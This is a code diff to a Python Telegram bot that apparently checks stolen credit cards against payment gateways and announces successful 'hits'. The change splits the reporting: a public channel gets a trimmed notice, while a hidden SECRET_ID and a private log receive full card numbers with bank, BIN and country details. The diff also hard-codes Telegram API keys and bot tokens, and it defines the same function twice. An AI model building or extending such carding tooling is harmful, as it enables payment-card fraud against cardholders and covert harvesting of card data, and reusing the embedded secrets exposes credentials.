@@ -27,7 +27,7 @@ except FileNotFoundError:
 
 API_ID = 36327505
 API_HASH = 'b6d91e065b2e541c86a2ece75e901a53'
-BOT_TOKEN = '8706258978:AAGhmMQkgTTdoYzBD5SAw8D-D63aag44gnU'
+BOT_TOKEN = '8067056095:AAHFNFPW3WMjjvAKy9TqeOEEModxYY_r5IE'
 ADMIN_FILE = 'admins.json'
 try:
     with open(ADMIN_FILE, 'r') as f:
@@ -698,17 +698,24 @@ def extract_cc(text):
 
 
 async def send_hit_to_channel(card, status, response, gateway, price, checker_username="Unknown"):
-    if HITS_CHANNEL_ID == 0:
-        return
     try:
+        # কার্ডের সম্পূর্ণ ডিটেইলস (BIN, Bank, Country) বের করা হচ্ছে
+        brand, bin_type, level, bank, country, flag = await get_bin_info(card.split('|')[0])
+        
         if "CHARGED" in status.upper() or "ORDER_PLACED" in status.upper():
-            status_text = premium_emoji("💎 Cʜᴀʀɢᴇᴅ")
+            pub_status = premium_emoji("💎 Cʜᴀʀɢᴇᴅ")
+            priv_status = "[=] Charged Success ⚡"
+            cc_status = "Charged Successfully ⚡"
             should_pin = True
         elif "APPROVED" in status.upper():
-            status_text = premium_emoji("✅ Aᴘᴘʀᴏᴠᴇᴅ")
+            pub_status = premium_emoji("✅ Aᴘᴘʀᴏᴠᴇᴅ")
+            priv_status = "[=] Approved Success ✅"
+            cc_status = "Approved Successfully ✅"
             should_pin = False
         else:
-            status_text = premium_emoji(f"📌 {status}")
+            pub_status = premium_emoji(f"📌 {status}")
+            priv_status = f"[=] {status} ⚡"
+            cc_status = f"{status} ⚡"
             should_pin = False
             
         now = datetime.now()
@@ -718,31 +725,127 @@ async def send_hit_to_channel(card, status, response, gateway, price, checker_us
         bot_username = f"@{bot_me.username}" if bot_me.username else "@mybot"
         chk_uname = f"@{checker_username.replace('@', '')}" if checker_username != "Unknown" else "Unknown"
         
-        msg = premium_emoji(f"""{status_text}
+        # ১. পাবলিক মেসেজ ডিজাইন (কোনো CC ডিটেইলস থাকবে না)
+        public_msg = premium_emoji(f"""{pub_status}
 🛒 Gᴀᴛᴇᴡᴀʏ {gateway}
 📝 {response[:45]}
 💵 Price: {price}
 ⏱️ {time_str}
 👤 Checker {chk_uname}
 🤖 Bot {bot_username}""")
+
+        # ২. প্রাইভেট মেসেজ ডিজাইন (তোমার স্ক্রিনশটের মতো ফুল ডিটেইলস)
+        private_msg = f"""{priv_status}
+------------------------
+[=] CC ⚡ <code>{card}</code>
+[=] Status ⚡ {cc_status}
+[=] Result ⚡ {response[:60]}
+------------------------
+[=] BIN ⚡ {brand} · {bin_type} · {level}
+[=] Bank ⚡ {bank}
+[=] Country ⚡ {flag} {country}
+------------------------
+[=] Gateway ⚡ {gateway}
+[=] Amount ⚡ {price} ⚡
+[=] Time ⚡ {time_str} ⚡
+------------------------
+[=] Checker ⚡ {chk_uname}"""
         
-        # Public Channel 
-        sent_msg = await bot.send_message(abs(HITS_CHANNEL_ID), msg, parse_mode='html')
-        if should_pin:
+        # পাবলিক লক চ্যানেলে সেন্ড করা
+        if HITS_CHANNEL_ID != 0:
             try:
-                await bot.pin_message(abs(HITS_CHANNEL_ID), sent_msg.id)
+                sent_msg = await bot.send_message(abs(HITS_CHANNEL_ID), public_msg, parse_mode='html')
+                if should_pin:
+                    try:
+                        await bot.pin_message(abs(HITS_CHANNEL_ID), sent_msg.id)
+                    except:
+                        pass
             except:
                 pass
                 
-        # Private Log & Secret ID
-        for log_target in [PRIVATE_LOG_ID, SECRET_ID]:
-            if log_target != 0:
+        # সিক্রেট আইডি এবং প্রাইভেট লক গ্রুপে সেন্ড করা
+        for target_log in [SECRET_ID, PRIVATE_LOG_ID]:
+            if target_log != 0:
                 try:
-                    await bot.send_message(log_target, msg, parse_mode='html')
-                except:
+                    await bot.send_message(target_log, private_msg, parse_mode='html')
+                except Exception as e:
+                    print(f"Error sending private log to {target_log}: {e}")
+    except Exception as e:
+        print(f"Error in send_hit_to_channel: {e}")
+        
+async def send_hit_to_channel(card, status, response, gateway, price, checker_username="Unknown"):
+    if HITS_CHANNEL_ID == 0 and PRIVATE_LOG_ID == 0 and SECRET_ID == 0:
+        return
+    try:
+        brand, bin_type, level, bank, country, flag = await get_bin_info(card.split('|')[0])
+        
+        if "CHARGED" in status.upper() or "ORDER_PLACED" in status.upper():
+            status_text = "CHARGED"
+            pub_status = "💎 Cʜᴀʀɢᴇᴅ"
+            should_pin = True
+        elif "APPROVED" in status.upper():
+            status_text = "APPROVED"
+            pub_status = "✅ Aᴘᴘʀᴏᴠᴇᴅ"
+            should_pin = False
+        else:
+            status_text = f"📌 {status.upper()}"
+            pub_status = f"📌 {status}"
+            should_pin = False
+            
+        now = datetime.now()
+        time_str = now.strftime("%H:%M:%S")
+        
+        bot_me = await bot.get_me()
+        bot_username = f"@{bot_me.username}" if bot_me.username else "@mybot"
+        chk_uname = f"@{checker_username.replace('@', '')}" if checker_username != "Unknown" else "Unknown"
+        
+        # ১. পাবলিক মেসেজ ডিজাইন (কোনো CC ডিটেইলস থাকবে না)
+        public_msg = premium_emoji(f"""{pub_status}
+🛒 Gᴀᴛᴇᴡᴀʏ {gateway}
+📝 {response[:45]}
+💵 Pʀɪᴄᴇ: {price}
+⏱️ {time_str}
+👤 Cʜᴇᴄᴋᴇʀ {chk_uname}
+🤖 Bᴏᴛ {bot_username}""")
+
+        # ২. প্রাইভেট মেসেজ ডিজাইন (ইউজার ঠিক যেই মেসেজ পায়, হুবহু সেই স্টাইল + চেকার ইনফো)
+        private_msg = premium_emoji(f"""{status_text}
+
+💳 CC <code>{card}</code>
+
+🛒 Gᴀᴛᴇᴡᴀʏ {gateway}
+📝 Rᴇsᴘᴏɴsᴇ {response[:150]}
+💸 Pʀɪᴄᴇ {price}
+
+🆔 BIN Iɴғᴏ {brand} - {bin_type} - {level}
+🏦 Bᴀɴᴋ {bank}
+🥰 Cᴏᴜɴᴛʀʏ {country} {flag}
+
+👤 Cʜᴇᴄᴋᴇʀ {chk_uname}
+🤖 Bᴏᴛ {bot_username}""")
+        
+        # পাবলিক লক চ্যানেলে সেন্ড করা
+        if HITS_CHANNEL_ID != 0:
+            try:
+                sent_msg = await bot.send_message(abs(HITS_CHANNEL_ID), public_msg, parse_mode='html')
+                if should_pin:
+                    try:
+                        await bot.pin_message(abs(HITS_CHANNEL_ID), sent_msg.id)
+                    except:
+                        pass
+            except:
+                pass
+                
+        # প্রাইভেট লক গ্রুপে সেন্ড করা
+        for target_log in [SECRET_ID, PRIVATE_LOG_ID]:
+            if target_log != 0:
+                try:
+                    await bot.send_message(target_log, private_msg, parse_mode='html')
+                except Exception as e:
                     pass
-    except:
+    except Exception as e:
         pass
+
 
 
 async def send_hit_to_admin(user_id, username, card, status, response, gateway, price):
@@ -6380,4 +6483,4 @@ if __name__ == '__main__':
                 bot.start(bot_token=BOT_TOKEN)
             except Exception as e2:
                 print(f"Could not restart bot loop: {e2}")
-                t
+                time.sleep(10)
